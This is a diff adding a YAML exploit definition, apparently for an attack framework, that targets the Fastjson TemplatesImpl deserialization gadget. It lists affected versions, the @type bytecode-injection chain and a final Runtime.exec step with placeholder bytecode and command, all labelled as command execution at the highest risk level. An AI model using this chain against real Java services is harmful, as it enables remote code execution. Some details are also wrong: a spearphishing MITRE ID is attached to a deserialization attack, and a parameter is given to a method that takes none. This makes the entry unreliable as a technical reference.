@@ -1,0 +1,26 @@
+name: "FastjsonTemplatesImpl"
+category: "fastjson"
+description: "Fastjson TemplatesImpl bytecode injection via @type"
+jdk_version: "all"
+dependencies:
+  - name: "fastjson"
+    version: "1.2.24-1.2.68"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/alibaba/fastjson/issues"
+steps:
+  - class_name: "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
+    method_name: "setBytecodes"
+    parameters:
+      - "{bytecode}"
+  - class_name: "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
+    method_name: "newTransformer"
+    parameters:
+      - "{command}"
+  - class_name: "java.lang.Runtime"
+    method_name: "exec"
+    parameters:
+      - "{command}"
